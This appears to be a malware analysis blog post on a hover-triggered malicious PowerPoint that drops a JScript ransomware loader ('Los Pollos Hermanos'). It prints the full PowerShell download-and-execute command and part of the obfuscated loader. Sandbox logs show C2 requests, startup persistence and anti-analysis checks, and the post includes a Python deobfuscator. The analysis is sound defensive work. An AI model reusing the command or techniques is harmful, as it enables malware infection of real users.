+++
title = "Analysis of a mouseover malicious powerpoint"
draft = false
tags = ["Maldocs",".ppt"]
categories = ["Phishing","Malicious_documents"]
ShowToc = true
+++

## Analysis of the order&prsn.ppt document
This post will be for the analysis of a malicious ppt document better known as order.ppt or prsn.ppt. General info about this document:
- MD5: 3bff3e4fec2b6030c89e792c05f049fc
- SHA256: 796a386b43f12b99568f55166e339fcf43a4792d292bdd05dafa97ee32518921

This document used an onhoven action on a link inside the document to try and invoke a powershell command.

### Powershell command
Initially, the first command used is the following powershell command which gets triggered upon hoverup on the hyperlink:  
![powershell command](/posts/malicious_ppt_1/powershell_command.png)
The command is:
```ps
powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http:'+[char] 0x2F+[char] 0x2F+'cccn.nl'+[char] 0x2F+'c.php',\"$env:temp\ii.jse\"); Invoke-Item \"$env:temp\ii.jse\""
```

We can further deobfuscate this command using engines like [tio.run](https://tio.run/):  
![tio.run](/posts/malicious_ppt_1/tioRun_powershell.png)  

So this command tries to:
- download a file named "c.php" from h[x][x]p://cccn.nl/c.php
- outputs the contents of this file to the temp directory and specifically to a file named ii.jse

Although the domain is not live anymore and thus we cannot downloaded the `ii.jse` directly from it, we can utilize [Hybrid Analysis](https://www.hybrid-analysis.com/sample/55821b2be825629d6674884d93006440d131f77bed216d36ea20e4930a280302?environmentId=100) to get it from there.

### ii.jse file analysis

Getting the file, we will see it is not really readable:  
```sh
┌──(connar㉿kali)-[~/Documents/hybrid_analysis_sample]
└─$ cat ii.jse       
#@~^jh0FAA==dm3rRHmD/2,{;x9+Wk  +[Ikl3b00KD:.\l0k       o1Fx;   Nn0bU+9idC0k%324+dEkqZ';        N0k     +9I/m3r%Str^4GF{;x9+0bUnNp/m3r%.n7knh:4+l*x;    N+Wr    +[ikC0k0(DKkVk&WxE      Nn0bxn[p/l0r%1WxDUO/:tmxq';U9+Wk        nNp/CVb%ors9+[,Rx!x[0bx+9ikC3b%nlMY42'E  [+6kx[I/m3b%nl.O4vf'!UN0rUNidC0k0Y4nFf{E        N+6k    nNp/C3b%5;bm32T'!xNWrxNp/C3r0Dkh+lq'!x[n6kxn[p/C3b04W;M&+'E     NWk     +[iklVrRVlDO+MG%{;UN0bxnNIdm3r%D;D
```  

This is because `.jse` files are basically encoded JScript files and thus we need to use a decoder to convert them to javascript format.

There are some tools online that decode Windows Scripts (encoded JScripts), one of them being the [scrdec18-VC8.exe](https://gist.github.com/bcse/1834878) that I used.  

After using the tool, we get the following javascript code (I have used an online js beautifier for structural purposes):  
```js
┌──(connar㉿kali)-[~/Documents/hybrid_analysis_sample]
└─$ cat beautified.js             
saki8Mars39 = undefined;
saki8formerMaking91 = undefined;
saki8Ephesus10 = undefined;
saki8which71 = undefined;
saki8reviewThe55 = undefined;
saki8broils34 = undefined;
saki8contntsThan1 = undefined;
saki8gilded98 = undefined;
saki8earth63 = undefined;
saki8earth63 = undefined;
saki8thee13 = undefined;
saki8quick30 = undefined;
saki8time51 = undefined;
saki8hour36 = undefined;
saki8latter78 = undefined;
saki8turning24 = undefined;
saki8strong50 = undefined;
saki8more23 = undefined;
saki8heirsMay63 = undefined;
saki8then21 = undefined;
saki8princes45 = undefined;
saki8rareSince57 = undefined;
var saki8haveTogether48 = {
    st9a: function(abert, z, n, m) {
        return String["fromChar" + "Co" + "" + "de"]((+'111') + 5)
    },
    revie5: '123'
} ['st9a'](function() {
    return true;
}, 0, 0, 1) + {
    marbl8a: function(abert, z, n, m) {
        return String["fromChar" + "Co" + "" + "de"]((+'109') + 5)
    },
    studi8: '95'
} ['marbl8a'](function() {
    return true;
}, 0, 0, 1) + {
    meta9a: function(abert, z, n, m) {
        return String["fromChar" + "Co" + "" + "de"]((+'92') + 5)
    },
    brig6: '103'
} ['meta9a'](function() {
    return true;
}, 0, 0, 1) + {
    works9a: function(abert, z, n, m) {
        return String["fromChar" + "Co" + "" + "de"]((+'105') + 5)
    },
    this94: '100'
} ['works9a'](function() {
    return true;
}, 0, 0, 1) + {
    whi5a: function(abert, z, n, m) {
        return String["fromChar" + "Co" + "" + "de"]((+'110') + 5)
    },
    pre8: '121'
} ['whi5a'](function() {

// A ton more code
```

I did not expect anything else than more obfuscated code, but the code seems "relatively" easy to understand from a first glance. We notice that most of the code's functionality is the same and it essentially just converts numbers to their Ascii representation.  

So it basically reconstructs commands that will be executed from the previously run powershell command.  

It is now time to deobfuscate the remaining javascript and see what the `ii.jse` actually tries to do. I will be trying out two different techniques to get a glance of what is happening:  
- Using box-js: A tool that runs the malicious javascript inside a sandbox and monitors its actions.
- Running a deobfuscator: I will write a deobfuscator in python to get the obfuscated strings and maybe understand what is happening.  

### Box-js
The tool can be found [here](https://github.com/CapacitorSet/box-js) and as I said, it is basically a tool to study Javascript malware (or in this case, the dropper).  

After building the tool based on the instructions of the repo, I tried running it but got errors:  
```sh
└─$ box-js ../beautified.js                          
Using a 10 seconds timeout, pass --timeout to specify another timeout in seconds
[info] IOC: Using standard fake sample file name C:Users\Sysop12\AppData\Roaming\Microsoft\Templates\CURRENT_SCRIPT_IN_FAKED_DIR.js when analyzing.
[info] IOC: The script read an environment variable
[info] IOC: The script read an environment variable
[info] IOC: The script read a file.
[info] Script tried to read the list of processes
[info] Script tried to read information about operating system
Trace: win32_process.execmethod_ not implemented!
    at Object.kill (/usr/local/lib/node_modules/box-js/lib.js:30:13)
    at Object.get (/usr/local/lib/node_modules/box-js/emulator/WMI.js:266:10)
    at get (<anonymous>)
    at VM2 Wrapper.get (/usr/local/lib/node_modules/box-js/node_modules/vm2/lib/bridge.js:447:11)
    at vm.js:7427:46
    at Script.runInContext (node:vm:149:12)
    at VM.runScript (/usr/local/lib/node_modules/box-js/node_modules/vm2/lib/vm.js:288:18)
    at /usr/local/lib/node_modules/box-js/node_modules/vm2/lib/vm.js:512:16
    at timeout_bridge.js:1:1
    at Script.runInContext (node:vm:149:12)
Exiting (use --no-kill to just simulate a runtime error).
```
Confused, I tried on Windows thinking it was a dll dependancy error, but was met with the same error.  

Then I thought of using the `--no-kill` parameter that the output suggested, and was now met with the following output:  
```sh
└─$ box-js ../beautified.js --no-kill                
Using a 10 seconds timeout, pass --timeout to specify another timeout in seconds
[info] IOC: Using standard fake sample file name C:Users\Sysop12\AppData\Roaming\Microsoft\Templates\CURRENT_SCRIPT_IN_FAKED_DIR.js when analyzing.
[info] IOC: The script read an environment variable
[info] IOC: The script read an environment variable
[info] IOC: The script read a file.
[info] Script tried to read the list of processes
[info] Script tried to read information about operating system
[info] IOC: The script read a file.
[info] IOC: The script wrote file 'C:\Users\MyUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\seter64.jse'.
[info] Saved beautified.js.1.results/117b18e9-bde7-4cf5-aa92-7c40f4b64584 (2 bytes)
[info] beautified.js.1.results/117b18e9-bde7-4cf5-aa92-7c40f4b64584 has been detected as ASCII text, with CRLF line terminators.
[info] IOC: The script created a resource.
[info] XMLHTTP https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&457&uid=1526398773&out=0&ver=20
[info] IOC: The script opened URL https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&457&uid=1526398773&out=0&ver=20 with XMLHTTP
[info] Header set for https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&457&uid=1526398773&out=0&ver=20:
[info] Data sent to https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&457&uid=1526398773&out=0&ver=20:
[info] POST https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&457&uid=1526398773&out=0&ver=20
[info] IOC: The script fetched an URL.
[info] Returning HTTP 404 (Not found); use --download to actually try to download the payload or --fake-download to fake the download

-- A lot more output --
```
The output consisted of multiple attempts to reach a specific url but failed (since the url and the file it tries to reach is no longer accessible).  

Again, the output helps by suggesting using either the `--download` or the `--fake-download` option to try and download the file just for the simulation purpose and for the rest of the `ii.jse` file to run.  

Using the `--fake-download` option, we finally got a lot information about the execution of the javascript:  
```sh
─$ box-js ../beautified.js --no-kill --fake-download --no-file-exists
Using a 10 seconds timeout, pass --timeout to specify another timeout in seconds
[info] IOC: Using standard fake sample file name C:Users\Sysop12\AppData\Roaming\Microsoft\Templates\CURRENT_SCRIPT_IN_FAKED_DIR.js when analyzing.
[info] IOC: The script read an environment variable
[info] IOC: The script read an environment variable
[info] IOC: The script read a file.
[info] Script tried to read the list of processes
[info] Script tried to read information about operating system
[info] IOC: The script read a file.
[info] IOC: The script wrote file 'C:\Users\MyUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\seter64.jse'.
[info] Saved beautified.js.1.results/9285bdc3-823c-4d61-8f4b-0c58e8ac22fe (2 bytes)
[info] beautified.js.1.results/9285bdc3-823c-4d61-8f4b-0c58e8ac22fe has been detected as ASCII text, with CRLF line terminators.
[info] IOC: The script created a resource.
[info] XMLHTTP https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20
[info] IOC: The script opened URL https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20 with XMLHTTP
[info] Header set for https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20:
[info] Data sent to https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20:
[info] POST https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20
[info] IOC: The script fetched an URL.
[info] Returning HTTP 200 (Success) with fake response payload 'console.log("EXECUTED DOWNLOADED PAYLOAD");'
[info] IOC: The script checked to see if a file exists.
[info] IOC: The script checked to see if a file exists.
[info] The sample created a file named 'example-file.exe'.
[info] IOC: The script wrote file 'example-file.exe'.
[info] Saved beautified.js.1.results/5b430cf8-3c84-4093-906b-8bfe2cca604d (3 bytes)
[info] beautified.js.1.results/5b430cf8-3c84-4093-906b-8bfe2cca604d has been detected as ASCII text, with no line terminators.
[info] IOC: The script created a resource.
[info] IOC: The script read a file.
[info] IOC: The script ran the command 'cmd /U /Q /C copy /Y "C:\Users\MyUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\seter64.jse" ".jse" && del /Q/F ""'.
[info] XMLHTTP https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&92&uid=1526398773&out=0&ver=20
[info] IOC: The script opened URL https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&92&uid=1526398773&out=0&ver=20 with XMLHTTP
[info] Header set for https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&92&uid=1526398773&out=0&ver=20:
[info] Data sent to https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&92&uid=1526398773&out=0&ver=20:
[info] POST https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&92&uid=1526398773&out=0&ver=20
[info] IOC: The script fetched an URL.
[info] Returning HTTP 200 (Success) with fake response payload 'console.log("EXECUTED DOWNLOADED PAYLOAD");'

-- A lot more --
```
The nice thing about `box-js` is that it creates a file named `IOC.json` that has stored in there all logged Indicators of Compromise (e.g., commands that were run on the systems, domains that where reached, files that were dropped etc.).  

Viewing the IOC.json for this sample reveals the following insights about the dropper:  
```json
└─$ cat IOC.json                                                                   
[
        {
                "type": "Sample Name",
                "value": {
                        "sample-name": "CURRENT_SCRIPT_IN_FAKED_DIR.js",
                        "sample-name-full": "C:Users\\Sysop12\\AppData\\Roaming\\Microsoft\\Templates\\CURRENT_SCRIPT_IN_FAKED_DIR.js"
                },
                "description": "Using standard fake sample file name C:Users\\Sysop12\\AppData\\Roaming\\Microsoft\\Templates\\CURRENT_SCRIPT_IN_FAKED_DIR.js when analyzing."
        },
        {
                "type": "Environ",
                "value": "temp",
                "description": "The script read an environment variable"
        },
        {
                "type": "Environ",
                "value": "userprofile",
                "description": "The script read an environment variable"
        },
        {
                "type": "FileRead",
                "value": {
                        "file": "C:Users\\Sysop12\\AppData\\Roaming\\Microsoft\\Templates\\CURRENT_SCRIPT_IN_FAKED_DIR.js"
                },
                "description": "The script read a file."
        },
        {
                "type": "FileRead",
                "value": {
                        "file": "C:\\Users\\MyUsername\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\seter64.jse"
                },
                "description": "The script read a file."
        },
        {
                "type": "FileWrite",
                "value": {
                        "file": "C:\\Users\\MyUsername\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\seter64.jse",
                        "contents": "\r\n"
                },
                "description": "The script wrote file 'C:\\Users\\MyUsername\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\seter64.jse'."
        },
        {
                "type": "NewResource",
                "value": {
                        "path": "C:\\Users\\MyUsername\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\seter64.jse",
                        "type": "ASCII text, with CRLF line terminators",
                        "latestUrl": "",
                        "md5": "81051bcc2cf1bedf378224b0a93e2877",
                        "sha1": "ba8ab5a0280b953aa97435ff8946cbcbb2755a27",
                        "sha256": "7eb70257593da06f682a3ddda54a9d260d4fc514f645237f5ca74b08f8da61a6"
                },
                "description": "The script created a resource."
        },
        {
                "type": "XMLHTTP",
                "value": {
                        "url": "https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20"
                },
                "description": "The script opened URL https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20 with XMLHTTP"
        },
        {
                "type": "UrlFetch",
                "value": {
                        "method": "POST",
                        "url": "https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20",
                        "headers": {
                                "cache-control": "private"
                        },
                        "body": "Microsoft Windows 10 Enterprise10.0.17134\r\n"
                },
                "description": "The script fetched an URL."
        },
        {
                "type": "FileExists",
                "value": "C:\\Users\\SYSOP1~1\\AppData\\Local\\Temp\\414.exe",
                "description": "The script checked to see if a file exists."
        },
        {
                "type": "FileExists",
                "value": "C:\\Users\\SYSOP1~1\\AppData\\Local\\Temp\\414.exe",
                "description": "The script checked to see if a file exists."
        },
        {
                "type": "FileWrite",
                "value": {
                        "file": "example-file.exe",
                        "contents": "???"
                },
                "description": "The script wrote file 'example-file.exe'."
        },
        {
                "type": "NewResource",
                "value": {
                        "path": "example-file.exe",
                        "type": "ASCII text, with no line terminators",
                        "latestUrl": "https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20",
                        "md5": "0d1b08c34858921bc7c662b228acb7ba",
                        "sha1": "2d86c2a659e364e9abba49ea6ffcd53dd5559f05",
                        "sha256": "a03b221c6c6eae7122ca51695d456d5222e524889136394944b2f9763b483615"
                },
                "description": "The script created a resource."
        },
        {
                "type": "FileRead",
                "value": {
                        "file": "???"
                },
                "description": "The script read a file."
        },
        {
                "type": "Run",
                "value": {
                        "command": "cmd /U /Q /C copy /Y \"C:\\Users\\MyUsername\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\seter64.jse\" \".jse\" && del /Q/F \"\""
                },
                "description": "The script ran the command 'cmd /U /Q /C copy /Y \"C:\\Users\\MyUsername\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\seter64.jse\" \".jse\" && del /Q/F \"\"'."
        },
...
```
Overall, it does some modifications on the .jse file (moving to a different location) and also tries to download a file from the url `https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&92&uid=1526398773&out=0&ver=20`. This will end up being the final executable that will be run. If we try to crack the value `e9e45de07d328e8d46adf4357840be5e` that is passed to the `add` parameter of the url, we will get back the word `pollos`:  

![tio.run](/posts/malicious_ppt_1/cracked_hash.png)  

It refers to the actual campaing itself, which was named `Los Pollos Hermanos` ransomware.  

We can get a more clean result by reviewing the `analysis.log` file generated by box-js:  
```sh
└─$ cat analysis.log
[info] IOC: Using standard fake sample file name C:Users\Sysop12\AppData\Roaming\Microsoft\Templates\CURRENT_SCRIPT_IN_FAKED_DIR.js when analyzing.
[info] IOC: The script read an environment variable
[info] IOC: The script read an environment variable
[info] IOC: The script read a file.
[info] Script tried to read the list of processes
[info] Script tried to read information about operating system
[info] IOC: The script read a file.
[info] IOC: The script wrote file 'C:\Users\MyUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\seter64.jse'.
[info] Saved beautified.js.1.results/9285bdc3-823c-4d61-8f4b-0c58e8ac22fe (2 bytes)
[info] beautified.js.1.results/9285bdc3-823c-4d61-8f4b-0c58e8ac22fe has been detected as ASCII text, with CRLF line terminators.
[info] IOC: The script created a resource.
[info] XMLHTTP https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20
[info] IOC: The script opened URL https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20 with XMLHTTP
[info] Header set for https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20:
[info] Data sent to https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20:
[info] POST https://185.159.82.38:45000/C/pollos.php?add=e9e45de07d328e8d46adf4357840be5e&438&uid=1526398773&out=0&ver=20
[info] IOC: The script fetched an URL.
[info] Returning HTTP 200 (Success) with fake response payload 'console.log("EXECUTED DOWNLOADED PAYLOAD");'
[info] IOC: The script checked to see if a file exists.
[info] IOC: The script checked to see if a file exists.
[info] The sample created a file named 'example-file.exe'.
[info] IOC: The script wrote file 'example-file.exe'.
[info] Saved beautified.js.1.results/5b430cf8-3c84-4093-906b-8bfe2cca604d (3 bytes)
[info] beautified.js.1.results/5b430cf8-3c84-4093-906b-8bfe2cca604d has been detected as ASCII text, with no line terminators.
[info] IOC: The script created a resource.
[info] IOC: The script read a file.
[info] IOC: The script ran the command 'cmd /U /Q /C copy /Y "C:\Users\MyUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\seter64.jse" ".jse" && del /Q/F ""'.
```

Now let's try out the second methodology of scripting out a deobfuscator for the decoded `.jse` instead of dynamically running it.  

### Making a deobfuscator
Since the whole obfuscation is based on converting from int to char (by also adding number 5), all we need to do is match the expression using regex, add 5 and convert:  
```python
import re
import sys

# Usage: python deobfuscate.py ii_decoded.js
if len(sys.argv) < 2:
    print("Usage: python deobfuscate.py <input_file>")
    sys.exit(1)

input_file = sys.argv[1]

# Regex to match '47' out of return String["fromChar" + "Co" + "" + "de"]((+'47') + 5)
pattern = re.compile(r"\+'([^']*)'")

with open(input_file, 'r', encoding='utf-8') as f:
    for line in f:
        matches = pattern.findall(line)
        for match in matches:
            try:
                val = int(match) + 5
                # Possible values that a byte can have
                if 0 < val <= 255:
                    print(chr(val), end='')
            except ValueError:
                pass
```
Running the deobfuscator, we get the following output:  
```
transe9e45de07d328e8d46adf4357840be5eWScriptEnumeratorGetObjectActiveXObjectCreateObjectWScript.ShellScripting.FileSystemObjectADODB.StreamShell.ApplicationExpandEnvironmentStrings%TEMP%ExpandEnvironmentStrings%USERPROFILE%fromCharCodefromCharCodefloorrandomMsxml2.ServerXMLHTTPseter64.jseNameSpacehttps://185.159.82.38:45000/C/pollos.php?add=MZPOSTScriptFullName2000000-decode 4294967295Drives*.doc *.xls *.pdf *.rtf *.txt *.pub *.odt *.ods *.odp *.odm *.odc *.odb *.wps *.xlk *.ppt *.mdb *.accdb *.pst *.dwg *.dxf *.dxg *.wpd *.rtf *.wb2 *.mdf *.dbf *.psd *.pdd *.eps *.ai *.indd *.cdr img_*.jpg *.dng *.3fr *.arw *.srf *.sr2 *.bay *.crw *.cr2 *.dcr *.kdc *.erf *.mef *.mrw *.nef *.nrw *.orf *.raf *.raw *.rwl *.rw2 *.r3dsaymyname.txtPopupError: Cannot open illustration.ErrorOpenTextFileReadLineClosetesbblengthcharCodeAtindexOfAppDatawinmgmts:{impersonationLevel=impersonate}!.rootcimv2ExecQuerySelect * from Win32_ProcessExecQuerySelect * from Win32_OperatingSystematEnditemCaptionitemVersionmoveNextatEnditemExecMethod_GetOwnerName*ExecutablePath*Domain|UserfromCharCodefromCharCodemoveNextindexOfProcmonindexOfWiresharkindexOfTempiexplore.exeindexOfProcessHackerindexOfvmtoolsdindexOfVBoxServiceindexOfpythonindexOfProxifier.exeindexOfJohnson-PCindexOfImmunityDebugger.exeindexOflordPE.exeindexOfctfmon.exe*JOHN-PCindexOfBehaviorDumperindexOfanti-virus.EXEindexOfAgentSimulator.exeindexOfVzService.exeindexOfVmRemoteGuestActionScrew you guys, Im going home!!!!CreateTextFileWriteLineClosefuck it..floorrandom.exefloorrandom.gopsetOptionMSXML&floorrandom&uid=abs&out=&ver=opensetRequestHeadercache-controlprivatesendfromCharCodefromCharCodesendstatusresponseTextsubstringOpenTypeWriteresponseBodyPositionSaveToFileCloseCreateTextFileWriteLineCloseSleepShellExecutecertutil openFileExistsgetResponseHeaderyou_god_damn_rightCopyFileSleepFileExistsatEndmoveNextitemIsReadyDriveTypeDriveTypesubstringDriveLetterShellExecutecmd/U /Q /C cd /D DriveLetter: && dir /b/s/x >>%TEMP%\\openSleepSleepGetFileOpenAsTextStreamAtEndOfStreamReadLinesubstringindexOf.ShellExecutecmd/U /Q /C copy /Y  .jse && del /Q/F openCloseDeleteFileGetFileOpenAsTextStreamReadLinesubstringShellExecutecmdfromCharCodec start openExecProcessIDSleepShellExecutecmd/U /Q /C del /Q/F %TEMP%\*.exe && del /Q/F %TEMP%\*.gop && del /Q/F %TEMP%\*.txt && del /Q/F %TEMP%\*.log && del /Q/F %TEMP%\*.jseopenDeleteFileCloseSleep
```
Even though the deobfuscated strings are concatenated to each other, we can get a few hints of what is going on:  
- Contacts the IP we previously found with a POST request.
- Enumerates some filetypes.
- Gets all the running processes via `Select * from Wind32_ProcessExec`. This explains the previous error we got from the `box-js` regarding `Trace: win32_process.execmethod_ not implemented!`
- After getting all the running processes, it tries to find if any of them are:   
  - ProcMon  
  - Wireshark
  - ProcessHacker
  - (more tool names usually used for malware analysis)  
  So the script tries to see if it is being monitored, and if it is, it exists (with some interesting comments to say the least...)


### Reversing the final exe [pollos] -To be continued...
The final file that will be dropped (named `pollos` from the cracked hash) can be found [here](https://www.hybrid-analysis.com/sample/9efc3aa23de09f1713a2e138760a42d0a14568c86cdbb5499d2adddbe197db57/5935aeaeaac2ed0e41bfe09c).  

TBC



**References**
<blockquote>
    <ul>
        <li> [1] <a href="https://www.youtube.com/watch?v=72Ztp7NNWqc">cybercdh: <i>Malicious Powerpoint and .jse behavioural and code analysis</i></a></li>
        <li> [2] <a href="https://www.virustotal.com/gui/file/796a386b43f12b99568f55166e339fcf43a4792d292bdd05dafa97ee32518921">VirusTotal: <i>order&prsn.ppsx</i></a></li>
        <li> [2] <a href="https://www.sentinelone.com/blog/zusy-powerpoint-malware-spreads-without-needing-macros/">“Zusy” PowerPoint Malware Spreads Without Needing Macros</i></a></li>
    </ul>
</blockquote>